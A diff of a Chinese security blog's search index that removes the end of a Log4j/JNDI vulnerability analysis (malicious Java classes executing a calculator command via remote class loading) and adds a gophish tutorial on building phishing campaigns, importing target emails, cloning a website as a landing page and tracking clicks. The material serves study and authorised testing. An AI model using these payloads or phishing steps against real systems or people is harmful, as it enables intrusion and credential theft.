-<p>这里我们可以看到有个readobject了，可以看看var4是怎么获取的也是一种思路<strong>我们这里是采用加载远程恶意类对象</strong> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114259827.png"
-                      class="" title="image-20250311114259827"
-                > 
-
-<p>可以看到我们的var20即将被返回的值是我们的远程恶意类对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114349568.png"
-                      class="" title="image-20250311114349568"
-                > 
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114558379.png"
-                      class="" title="image-20250311114558379"
-                > 
-
-<p>然后将我们的恶意类对象给实例化</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114639838.png"
-                      class="" title="image-20250311114639838"
-                > 
-
-<p>跟进函数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114944263.png"
-                      class="" title="image-20250311114944263"
-                > 发现builder为null，所以不会进入这个if
-
-<p>将恶意类名称赋值给了ref</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311115057408.png"
-                      class="" title="image-20250311115057408"
-                > 
-
-<p>获取对象的实例</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120004969.png"
-                      class="" title="image-20250311120004969"
-                >
-
-<p>获取实例的时候会调用我们写的无参构造方法，所以就执行了我们的恶意代码。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120021055.png"
-                      class="" title="image-20250311120021055"
-                > 
-
-<h2 id="恶意类的无参构造初始化"><a href="#恶意类的无参构造初始化" class="headerlink" title="恶意类的无参构造初始化"></a>恶意类的无参构造初始化</h2><p>根据上面链子发现factory.getObjectInstance函数会调用我们的类的无参实例化方法</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="类的静态方法"><a href="#类的静态方法" class="headerlink" title="类的静态方法"></a>类的静态方法</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil_static &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311125258505.png"
-                      class="" title="image-20250311125258505"
-                >
-
-<p>成功造成命令执行</p>
-<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里的漏洞触发点有一些不同</p>
-<p>javax&#x2F;naming&#x2F;spi&#x2F;NamingManager.java</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130215787.png"
-                      class="" title="image-20250311130215787"
-                > 
-
-<p>这里有个if判断，codebase为null所以不会进去</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130605217.png"
-                      class="" title="image-20250311130605217"
-                > 
-
-<p>最后会走到对我们恶意类的实例化</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130335797.png"
-                      class="" title="image-20250311130335797"
-                >
-
-<p>然后实例化调用了静态方法造成RCE</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130639541.png"
-                      class="" title="image-20250311130639541"
-                > 
-
-]]></content>
-      <categories>
-        <category>漏洞原理分析</category>
-      </categories>
-      <tags>
-        <tag>JNDI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MVEL表达式漏洞利用方式</title>
     <url>/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
     <content><![CDATA[<p>MVEL 是一个表达式语言，一般用于解析和执行基于 Java 基础语言和语法风格的表达式。在动态规则执行和条件匹配方面，MVEL 是一个出色的选择，因为它允许你在运行时定义和修改规则，并立即处理这些规则。</p>
@@ -2163,6 +2163,291 @@
 
 <p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>gophish钓鱼平台使用</title>
+    <url>/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>Gophish是为企业和渗透测试人员设计的开源网络钓鱼工具包。 它提供了快速，轻松地设置和执行网络钓鱼攻击以及安全意识培训的能力。</p>
+<p>gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的巨大的便捷，并且在功能上实现分块，令钓鱼初学者能够更好理解钓鱼工作各部分的原理及运用。</p>
+<h2 id="gophish的安装配置"><a href="#gophish的安装配置" class="headerlink" title="gophish的安装配置"></a>gophish的安装配置</h2><p><a class="link"   href="https://github.com/gophish/gophish" >https://github.com/gophish/gophish<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>下载地址</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用wget下载安装包</span><br><span class="line">wget https://github.com/gophish/gophish/releases/download/v0.10.1/gophish-v0.10.1-linux-32bit.zip</span><br><span class="line"></span><br><span class="line">wget https://github.com/gophish/gophish/releases/download/v0.10.1/gophish-v0.10.1-linux-64bit.zip</span><br><span class="line"></span><br><span class="line">#解压</span><br><span class="line">mkdir gophish</span><br><span class="line">unzip gophish-v0.10.1-linux-64bit.zip -d ./gophish</span><br><span class="line"></span><br><span class="line">#修改配置文件</span><br><span class="line">cd gophish</span><br><span class="line">vim config.json</span><br></pre></td></tr></table></figure></div>
+
+<p>下载好了之后修改config.json</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161203441.png"
+                      class="" title="image-20250325161203441"
+                > 
+
+<p>修改0.0.0.0，就可以坚听所有的访问，我们可以远程访问web界面</p>
+<p><a class="link"   href="https://ip:3333/" >https://ip:3333/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>账号密码: admin&#x2F;gophish</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161538096.png"
+                      class="" title="image-20250325161538096"
+                > 
+
+<p>登录进去后</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161634326.png"
+                      class="" title="image-20250325161634326"
+                > 
+
+<h2 id="Users-Groups"><a href="#Users-Groups" class="headerlink" title="Users &amp; Groups"></a>Users &amp; Groups</h2><p>这里是用来配置我们将来要钓鱼的人的信息的</p>
+<h3 id="单独添加目标邮箱"><a href="#单独添加目标邮箱" class="headerlink" title="单独添加目标邮箱"></a>单独添加目标邮箱</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161743041.png"
+                      class="" title="image-20250325161743041"
+                > 
+
+<p>输入我们要发送给目标的邮箱地址，一个一个输入的话记得点add</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161819758.png"
+                      class="" title="image-20250325161819758"
+                > 
+
+<p>这才是添加成功的样子</p>
+<h3 id="批量添加目标邮箱"><a href="#批量添加目标邮箱" class="headerlink" title="批量添加目标邮箱"></a>批量添加目标邮箱</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325161904743.png"
+                      class="" title="image-20250325161904743"
+                > 
+
+<p>先选择下载模版</p>
+<p>然后编辑csv文件</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162006234.png"
+                      class="" title="image-20250325162006234"
+                > 
+
+<p>添加目标邮箱</p>
+<p>然后导入</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162112090.png"
+                      class="" title="image-20250325162112090"
+                > 
+
+<p>这里就设置目标成功了</p>
+<h2 id="Email-Templates"><a href="#Email-Templates" class="headerlink" title="Email Templates"></a>Email Templates</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162223620.png"
+                      class="" title="image-20250325162223620"
+                > 
+
+<p>这里有一个import email，导入邮箱模版的，我们可以先给自己发一封钓鱼邮件然后下载他，然后粘贴上来</p>
+<h3 id="邮件模版生成"><a href="#邮件模版生成" class="headerlink" title="邮件模版生成"></a>邮件模版生成</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162517050.png"
+                      class="" title="image-20250325162517050"
+                > 
+
+<p><strong>我们可以附上我们的恶意链接。此时模版的链接后面会被替换掉</strong> ，链接需要用邮件的格式的，不是自己写一个<a class="link"   href="http://www.baidu.com就可以被替换的/" >http://www.baidu.com就可以被替换的<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162829310.png"
+                      class="" title="image-20250325162829310"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162931412.png"
+                      class="" title="image-20250325162931412"
+                > 
+
+<p>然后发送给自己</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163050976.png"
+                      class="" title="image-20250325163050976"
+                > 
+
+<p>接收到的邮件我们点击最右边那个</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163137803.png"
+                      class="" title="image-20250325163137803"
+                > 
+
+<p>导出为eml文件，然后将文件转换为txt格式</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163221120.png"
+                      class="" title="image-20250325163221120"
+                > 
+
+<p>将内容复制进import templates里面</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163246272.png"
+                      class="" title="image-20250325163246272"
+                > 
+
+<p>我后面换了个文案，好像我的乱码有点多哈哈哈哈</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163500431.png"
+                      class="" title="image-20250325163500431"
+                > 
+
+<p>蓝色的就是链接</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163539238.png"
+                      class="" title="image-20250325163539238"
+                > 
+
+<p>模版生成成功了</p>
+<h2 id="Sending-Profiles"><a href="#Sending-Profiles" class="headerlink" title="Sending Profiles"></a>Sending Profiles</h2><p>配置发送邮件的邮箱</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163745551.png"
+                      class="" title="image-20250325163745551"
+                > 
+
+<h3 id="授权码获得地址"><a href="#授权码获得地址" class="headerlink" title="授权码获得地址"></a>授权码获得地址</h3><p>账号与安全</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163829319.png"
+                      class="" title="image-20250325163829319"
+                > 
+
+<p>安全设置</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163855977.png"
+                      class="" title="image-20250325163855977"
+                > 
+
+<p>开启服务</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163907423.png"
+                      class="" title="image-20250325163907423"
+                > 
+
+<p>设备管理、授权码管理</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325163940226.png"
+                      class="" title="image-20250325163940226"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164044782.png"
+                      class="" title="image-20250325164044782"
+                > 
+
+<p>可以测试一下看看是否可以发送成功</p>
+<h2 id="Landing-Pages"><a href="#Landing-Pages" class="headerlink" title="Landing Pages"></a>Landing Pages</h2><p>这个模块是用来伪造页面的</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164152096.png"
+                      class="" title="image-20250325164152096"
+                > 
+
+<p>这里会让我们填写一个url</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164238610.png"
+                      class="" title="image-20250325164238610"
+                > 
+
+<p>伪造一下老美的</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164259789.png"
+                      class="" title="image-20250325164259789"
+                > 
+
+<p>就可以构造一个老美的页面了</p>
+<h2 id="Campaigns"><a href="#Campaigns" class="headerlink" title="Campaigns"></a>Campaigns</h2><p>配置任务</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164611276.png"
+                      class="" title="image-20250325164611276"
+                > 
+
+<p>配置好了之后发送</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164819733.png"
+                      class="" title="image-20250325164819733"
+                > 
+
+<p>收到了邮件</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164838362.png"
+                      class="" title="image-20250325164838362"
+                > 
+
+<p>点击下那个链接，我也不知道为啥是乱码的，好奇怪这次</p>
+<p><strong>Tips</strong> 替换的链接是需要这里配置的，而不是我们直接在邮件里面写好的<a class="link"   href="http://www.baidu.com那样/" >http://www.baidu.com那样<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325162829310.png"
+                      class="" title="image-20250325162829310"
+                > 
+
+<p>是需要这种地方添加的</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164914545.png"
+                      class="" title="image-20250325164914545"
+                > 
+
+<p>是一个老美的网站的界面</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/image-20250325164944070.png"
+                      class="" title="image-20250325164944070"
+                > 
+
+<p>统计到了我点击了恶意链接。然后也能接受数据。如果是个登录界面用户输入了不该输入的参数</p>
+]]></content>
+      <tags>
+        <tag>gophish</tag>
+      </tags>
   </entry>
   <entry>
     <title>spring框架bean加载漏洞</title>
